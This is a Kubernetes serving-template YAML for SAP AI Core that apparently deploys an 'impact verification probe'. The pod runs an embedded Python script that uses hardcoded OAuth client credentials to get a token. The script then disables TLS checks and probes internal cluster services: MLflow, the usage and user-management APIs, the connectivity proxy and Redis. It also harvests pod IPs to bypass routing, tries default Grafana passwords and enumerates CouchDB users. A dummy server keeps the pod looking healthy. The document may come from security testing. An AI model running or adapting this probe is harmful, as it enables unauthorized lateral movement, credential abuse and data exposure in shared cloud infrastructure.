apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v3
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v3"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v3"
    executables.ai.sap.com/name: "impact-probe-v3"
    executables.ai.sap.com/description: "impact verification probe v3"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, ssl, socket, json, re, base64, time, urllib.request, urllib.error

            CLIENT_ID     = "sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784"
            CLIENT_SECRET = "aicore-bb-12-key$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw="
            TOKEN_URL     = "https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token"

            def report(k, v):
                print(f"[P3] {k}: {str(v)[:6000]}", flush=True)

            def http_get(url, headers=None, timeout=10):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:1000]
                    except: pass
                    hdrs = dict(e.headers) if hasattr(e, "headers") else {}
                    return f"HTTP_{e.code}:{body}", e.code, hdrs
                except Exception as e:
                    return f"ERR:{e}", 0, {}

            def http_post_form(url, fields, headers=None, timeout=10):
                try:
                    data = "&".join(f"{k}={v}" for k, v in fields.items()).encode()
                    h = {"Content-Type": "application/x-www-form-urlencoded"}
                    if headers: h.update(headers)
                    req = urllib.request.Request(url, data=data, headers=h, method="POST")
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:500]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code
                except Exception as e:
                    return f"ERR:{e}", 0

            def tcp_send(host, port, data, pre_sleep=0, timeout=8, read_bytes=16384):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((host, port))
                    if pre_sleep > 0:
                        time.sleep(pre_sleep)
                    if isinstance(data, str):
                        data = data.encode()
                    s.sendall(data)
                    time.sleep(1.5)
                    resp = b""
                    s.settimeout(6)
                    try:
                        while True:
                            chunk = s.recv(read_bytes)
                            if not chunk: break
                            resp += chunk
                            if len(resp) > 65536: break
                    except socket.timeout:
                        pass
                    s.close()
                    return resp.decode("utf-8", errors="replace")
                except Exception as e:
                    return f"ERR:{e}"

            # ── fetch fresh XSUAA token from inside the pod ────────────────────────
            report("---", "=== FETCH XSUAA TOKEN ===")
            cred_b64 = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
            token_body, token_code = http_post_form(
                TOKEN_URL,
                {"grant_type": "client_credentials"},
                headers={"Authorization": f"Basic {cred_b64}"},
                timeout=15
            )
            report("TOKEN_FETCH", f"[{token_code}] {token_body[:100]}")
            JWT = None
            if token_code == 200:
                try:
                    JWT = json.loads(token_body)["access_token"]
                    report("JWT_OBTAINED", f"len={len(JWT)} prefix={JWT[:60]}")
                except Exception as e:
                    report("JWT_PARSE_ERR", str(e))
            else:
                report("TOKEN_FETCH_FAIL", token_body[:300])

            AUTH = {"Authorization": f"Bearer {JWT}"} if JWT else {}

            # ── 1. ML-TRACKING with real XSUAA JWT ────────────────────────────────
            report("---", "=== ML-TRACKING with JWT ===")
            ml_base = "http://ml-tracking-service.ml-tracking.svc.cluster.local:80"
            mlflow_paths = [
                "/health",
                "/",
                "/api/2.0/mlflow/experiments/list",
                "/api/2.0/mlflow/experiments/search",
                "/api/2.0/mlflow/runs/search",
                "/api/2.0/mlflow/registered-models/list",
                "/api/2.0/mlflow/model-versions/search",
                "/ajax-api/2.0/mlflow/experiments/list",
                "/ajax-api/2.0/mlflow/runs/search",
                "/metrics",
            ]
            for path in mlflow_paths:
                body, code, hdrs = http_get(f"{ml_base}{path}", headers=AUTH, timeout=8)
                report(f"MLFLOW_JWT_{path.replace('/','_').strip('_')}", f"[{code}] {body[:600]}")
                if code == 200 and "experiment" in body.lower():
                    report("MLFLOW_DATA_FOUND", f"path={path} body={body[:1000]}")

            # ── 2. USAGE-API with real JWT ─────────────────────────────────────────
            report("---", "=== USAGE-API with JWT ===")
            usage_base = "http://usage-api-service.usage-api.svc.cluster.local:80"
            for path in ["/", "/health", "/metrics", "/api/v1/usage", "/api/v1/reports",
                         "/api/v1/metering", "/api/v1/tenants"]:
                body, code, _ = http_get(f"{usage_base}{path}", headers=AUTH, timeout=8)
                report(f"USAGE_JWT_{path.replace('/','_').strip('_')}", f"[{code}] {body[:500]}")

            # ── 3. CONNECTIVITY PROXY with our XSUAA JWT ──────────────────────────
            report("---", "=== CONNECTIVITY PROXY with JWT ===")
            conn_base = "http://connectivity-proxy.connectivity-proxy.svc.cluster.local:20003"
            if JWT:
                body, code, hdrs = http_get(conn_base,
                    headers={"SAP-CP-Connectivity-Service-Token": JWT}, timeout=8)
                report("CONN_PROXY_JWT_20003", f"[{code}] {body[:500]}")

                # also try port 20001 and 20004
                for port in [20001, 20004]:
                    body, code, _ = http_get(
                        f"http://connectivity-proxy.connectivity-proxy.svc.cluster.local:{port}",
                        headers={"SAP-CP-Connectivity-Service-Token": JWT}, timeout=8)
                    report(f"CONN_PROXY_JWT_{port}", f"[{code}] {body[:400]}")

                # try with Authorization header format too
                body, code, _ = http_get(conn_base, headers={
                    "SAP-CP-Connectivity-Service-Token": JWT,
                    "Authorization": f"Bearer {JWT}",
                    "proxy-authorization": f"Bearer {JWT}",
                }, timeout=8)
                report("CONN_PROXY_JWT_COMBO", f"[{code}] {body[:400]}")

            # ── 4. REDIS with longer wait ──────────────────────────────────────────
            report("---", "=== REDIS (longer timeout) ===")
            redis_host = "redis.user-management.svc.cluster.local"
            redis_port = 6379

            # try sending PING after 3s delay (let mTLS settle)
            for delay in [3, 0]:
                r = tcp_send(redis_host, redis_port, b"PING\r\n", pre_sleep=delay, timeout=12)
                report(f"REDIS_PING_delay{delay}s", repr(r[:300]))

            # try inline commands
            for cmd in [b"PING\r\n", b"INFO\r\n", b"KEYS *\r\n", b"DBSIZE\r\n",
                        b"CONFIG GET maxmemory\r\n", b"CLIENT GETNAME\r\n"]:
                r = tcp_send(redis_host, redis_port, cmd, pre_sleep=2, timeout=10)
                report(f"REDIS_CMD_{cmd.strip().decode()[:20]}", repr(r[:400]))
                if r and not r.startswith("ERR"):
                    report("REDIS_LIVE", f"got response to {cmd.strip()}")

            # try RESP3 HELLO protocol
            r = tcp_send(redis_host, redis_port, b"HELLO\r\n", pre_sleep=2, timeout=10)
            report("REDIS_HELLO", repr(r[:400]))

            # ── 5. GET FRESH POD IPs FROM KSM ─────────────────────────────────────
            report("---", "=== KSM fresh pod IPs ===")
            ksm_pods_url = "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
            bp, cp, _ = http_get(ksm_pods_url, timeout=20)
            report("KSM_PODS_STATUS", f"[{cp}] len={len(bp)}")
            if cp == 200:
                pod_ip_re = re.compile(
                    r'kube_pod_info\{[^}]*namespace="([^"]+)"[^}]*pod="([^"]+)"[^}]*pod_ip="([^"]+)"')
                pod_map = {}
                for m in pod_ip_re.finditer(bp):
                    ns, pod, ip = m.group(1), m.group(2), m.group(3)
                    for svc in ["grafana", "couchdb", "velero", "redis", "argocd", "not-diamond",
                                "ml-tracking", "user-management", "llm", "fluent", "connectivity"]:
                        if svc in ns.lower() or svc in pod.lower():
                            pod_map.setdefault(svc, []).append((ns, pod, ip))
                for svc, entries in pod_map.items():
                    report(f"POD_IPs_{svc}", str(entries[:8]))

                # now probe grafana and couchdb directly by pod IP (bypass service/Istio sidecar routing)
                grafana_entries = pod_map.get("grafana", [])
                couch_entries   = pod_map.get("couchdb", [])
                velero_entries  = pod_map.get("velero", [])

                for ns, pod, ip in grafana_entries[:3]:
                    for port in [3000, 8080, 80]:
                        body, code, hdrs = http_get(f"http://{ip}:{port}/api/health", timeout=5)
                        report(f"GRAFANA_PODIP_{ip}:{port}", f"[{code}] {body[:300]}")
                        if code == 200:
                            for creds in ["admin:admin", "admin:password", "admin:grafana"]:
                                enc = base64.b64encode(creds.encode()).decode()
                                b2, c2, _ = http_get(f"http://{ip}:{port}/api/org",
                                    headers={"Authorization": f"Basic {enc}"}, timeout=5)
                                report(f"GRAFANA_AUTH_{creds}_podip", f"[{c2}] {b2[:300]}")
                                if c2 == 200:
                                    b3, c3, _ = http_get(f"http://{ip}:{port}/api/datasources",
                                        headers={"Authorization": f"Basic {enc}"}, timeout=5)
                                    report("GRAFANA_DATASOURCES_podip", f"[{c3}] {b3[:800]}")

                for ns, pod, ip in couch_entries[:3]:
                    for port in [5984, 5986]:
                        body, code, _ = http_get(f"http://{ip}:{port}/", timeout=5)
                        report(f"COUCH_PODIP_{ip}:{port}", f"[{code}] {body[:300]}")
                        if code == 200 and "couchdb" in body.lower():
                            for path in ["/_all_dbs", "/_session", "/_membership",
                                         "/_node/_local/_config", "/_users/_all_docs"]:
                                b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
                                report(f"COUCH_PODIP_{path}", f"[{c2}] {b2[:500]}")

                for ns, pod, ip in velero_entries[:3]:
                    for port in [8085, 11000, 8080]:
                        body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=5)
                        report(f"VELERO_PODIP_{ip}:{port}", f"[{code}] {body[:500]}")
                        if code == 200:
                            ns_hits = re.findall(r'namespace="([^"]+)"', body)
                            report("VELERO_PODIP_NAMESPACES", str(sorted(set(ns_hits))[:30]))

            # ── 6. USER-MANAGEMENT API with JWT ───────────────────────────────────
            report("---", "=== USER-MANAGEMENT API with JWT ===")
            um_base = "http://user-management-api-service.user-management.svc.cluster.local:5000"
            for path in ["/", "/health", "/api/v1/tenants", "/api/v1/users",
                         "/api/v1/subaccounts", "/api/v1/instances"]:
                body, code, hdrs = http_get(f"{um_base}{path}", headers=AUTH, timeout=8)
                report(f"UM_JWT_{path.replace('/','_').strip('_')}", f"[{code}] {body[:500]}")

            # ── 7. OTel TA: grab per-pod image versions ───────────────────────────
            report("---", "=== OTel TA pod annotations (image versions) ===")
            ta_url = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80/jobs/kubernetes-pods/targets"
            body_ta, code_ta, _ = http_get(ta_url, timeout=20)
            report("TA_STATUS", f"[{code_ta}] len={len(body_ta)}")
            if code_ta == 200:
                try:
                    data = json.loads(body_ta)
                    for collector_id, cdata in data.items():
                        for tg in cdata.get("targets", []):
                            lbl = tg.get("labels", {})
                            ns  = lbl.get("__meta_kubernetes_namespace", "")
                            pod = lbl.get("__meta_kubernetes_pod_name", "")
                            img = lbl.get("__meta_kubernetes_pod_container_image", "")
                            for svc in ["grafana", "couchdb", "velero", "redis", "argocd"]:
                                if svc in ns.lower() or svc in pod.lower():
                                    report(f"IMG_{svc}", f"ns={ns} pod={pod} image={img}")
                except Exception as e:
                    report("TA_PARSE_ERR", str(e))

            report("DONE", "probe v3 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
